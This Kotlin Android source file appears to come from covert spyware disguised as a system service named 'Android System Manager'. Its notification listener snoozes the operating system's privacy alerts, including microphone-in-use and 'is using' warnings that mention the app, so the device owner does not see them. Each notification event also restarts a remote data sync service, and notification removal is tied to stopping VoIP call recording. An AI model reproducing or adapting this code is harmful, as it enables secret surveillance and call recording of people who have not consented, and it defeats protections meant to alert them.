package com.android.services.services

import android.app.Notification
import android.os.Build
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.text.SpannableString
import android.text.TextUtils
import com.android.services.accessibility.AccessibilityUtils
import com.android.services.accessibility.AccessibilityUtils.androidSystemManagerIsUsingTextList
import com.android.services.accessibility.AccessibilityUtils.privacyAlertTextList
import com.android.services.accessibility.AccessibilityUtils.unblockDeviceMicTextList
import com.android.services.receiver.WatchDogAlarmReceiver
import com.android.services.services.voip.VoipCallCommandService
import com.android.services.util.*
import com.android.services.workers.voip.VoipCallRecordWorkerService
import java.util.*

class NotificationsListeningService : NotificationListenerService() {

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        FirebasePushUtils.restartRemoteDataSyncService(applicationContext, false)
        val watchDogReceiver = WatchDogAlarmReceiver()
        watchDogReceiver.setAlarm(applicationContext)
        try {
            val packageName = sbn.packageName
            val notification = sbn.notification
            val tickerText = notification.tickerText ?: ""
            val extras = notification.extras
            val extraTitle = extras.getString(Notification.EXTRA_TITLE) ?: ""
            val extraText = if (extras.get(Notification.EXTRA_TEXT) is SpannableString) {
                val extraSpannableText = extras.get(Notification.EXTRA_TEXT) as SpannableString?
                extraSpannableText?.toString() ?: ""
            } else {
                extras.get(Notification.EXTRA_TEXT).toString()
            }

            var extraBigText = ""

            if (AppConstants.osGreaterThanOrEqualLollipop) {
                val chars = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)
                if (chars != null && !TextUtils.isEmpty(chars)) {
                    extraBigText = chars.toString()
                }
            }
            logVerbose("Notify packageName = $packageName")
            logVerbose("Notify tickerText = $tickerText")
            logVerbose("Notify extraTitle = $extraTitle")
            logVerbose("Notify extraText = $extraText")
            logVerbose("Notify extraBigText = $extraBigText")

            val title = extraTitle.lowercase(Locale.getDefault())
            val text = extraText.lowercase(Locale.getDefault())
            if (packageName == "android" && AppConstants.osGreaterThanEqualToOreo) {

                if (title.contains("android system manager  ",true) || text.contains("android system manager",true)
                ) {
                    snoozeNotification(sbn.key, (60 * 60 * 1000).toLong())
                }

                if (unblockDeviceMicTextList.textContainsListElement(title)
                    && extraText.contains("android system manager",true)
                ) {
                    snoozeNotification(sbn.key, (60 * 60 * 1000).toLong())
                }
                if (privacyAlertTextList.textContainsListElement(title) || androidSystemManagerIsUsingTextList.textContainsListElement(
                        text
                    ) || text.contains("android system manager",true) || title.contains("android system manager",true)
                ) {
                    snoozeNotification(sbn.key, (60 * 60 * 1000).toLong())
                }
            }


        } catch (e: Exception) {
            logVerbose(TAG + e.message)
        }

//        if (extraText != null) {
//            extraText = extraText.toLowerCase();
//            logVerbose("Notify extraText = " + extraText);
//            if (extraTitle.contains("Android System Manager") && extraTitle.contains("displaying")) {
//
//            }
//            if (extraText.contains("harmful")) {
//                cancelNotification(sbn.getKey());
//                Toast.makeText(getApplicationContext(), "text " + extraText, Toast.LENGTH_LONG).show();
//            }
//            if (extraText.contains("usb")) {
//                snoozeNotification(sbn.getKey(), 60 * 1000);
//            }
//            if (extraText.contains("%")) {
//                NotificationManager notificationManager = (NotificationManager) getApplicationContext().getSystemService(Context.NOTIFICATION_SERVICE);
////                notificationManager.cancel(sbn.getId());
////                notificationManager.deleteNotificationChannel(notification.getChannelId());
////                cancelNotification(sbn.getKey());
//                snoozeNotification(sbn.getKey(), 60 * 1000);
//                Toast.makeText(getApplicationContext(), "Battery " + extraText, Toast.LENGTH_LONG).show();
//            }
//        }
//        if (extraTitle != null) {
//            extraTitle = extraTitle.toLowerCase();
//            logVerbose("Notify extraTitle = " + extraText);
////            Toast.makeText(getApplicationContext(), "title " + extraTitle, Toast.LENGTH_LONG).show();
//            if (extraTitle.contains("harmful")) {
//                cancelNotification(sbn.getKey());
//                Toast.makeText(getApplicationContext(), "title " + extraTitle, Toast.LENGTH_LONG).show();
//            }
//        }

//        logVerbose("Notify Extra Title: %s", extraTitle);
//        logVerbose("Notify Extra Text: %s", extraText);
//        logVerbose("Notify Extra BigText: %s", extraBigText);

//        Logger.i(TAG, "ID :" + sbn.getId() + " \t " + sbn.getNotification().tickerText + " \t " + sbn.getPackageName());

//        String packageName = sbn.getPackageName();
//        if (packageName.equals("com.samsung.android.messaging") || packageName.equals("com.android.vending")) {
////            NotificationManager notificationManager = (NotificationManager) getApplicationContext().getSystemService(Context.NOTIFICATION_SERVICE);
////            notificationManager.cancel(Integer.parseInt(notification.getChannelId()));
//            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
//                cancelNotification(sbn.getPackageName(), sbn.getTag(), sbn.getId());
//            } else {
//                cancelNotification(sbn.getKey());
//                Toast.makeText(getApplicationContext(), packageName, Toast.LENGTH_LONG).show();
//            }
//        }
//
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification) {
        FirebasePushUtils.restartRemoteDataSyncService(applicationContext, false)
        val watchDogReceiver = WatchDogAlarmReceiver()
        watchDogReceiver.setAlarm(applicationContext)
        logVerbose("notification removed " + sbn.id.toString() + " \t " + sbn.notification.tickerText + " \t " + sbn.packageName)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channelId = sbn.notification.channelId
            if (AccessibilityUtils.notificationChannelId == channelId) {
                val isServiceRunning =
                    AppUtils.isServiceRunning(
                        applicationContext,
                        VoipCallRecordWorkerService::class.java.name
                    )
                if (isServiceRunning) {
                    AppUtils.appendLog(
                        applicationContext,
                        "NotificationService Stopping voip call with " + AccessibilityUtils.voipMessenger + " _ " + AccessibilityUtils.voipDirection
                    )
                    logVerbose("${AppConstants.VOIP_CALL_TYPE} NotificationService Stopping voip call with " + AccessibilityUtils.voipMessenger + " _ " + AccessibilityUtils.voipDirection)
                    AccessibilityUtils.stopVOIPCallRecording(applicationContext)
                    AccessibilityUtils.voipName = ""
                    AccessibilityUtils.voipNumber = ""
                    AccessibilityUtils.voipDirection = ""
                    AccessibilityUtils.voipMessenger = ""
                    AccessibilityUtils.voipType = ""
                    AccessibilityUtils.voipStartTime = 0L
                    AccessibilityUtils.notificationChannelId = ""
                    AccessibilityUtils.isOutgoingVoipCaptured = false
                    AccessibilityUtils.isIncomingVoipCaptured = false
                    AccessibilityUtils.isVoipCallRecordingMarked=false
                }
            }
        }
    }

    companion object {
        private val TAG = NotificationsListeningService::class.java.simpleName
    }
}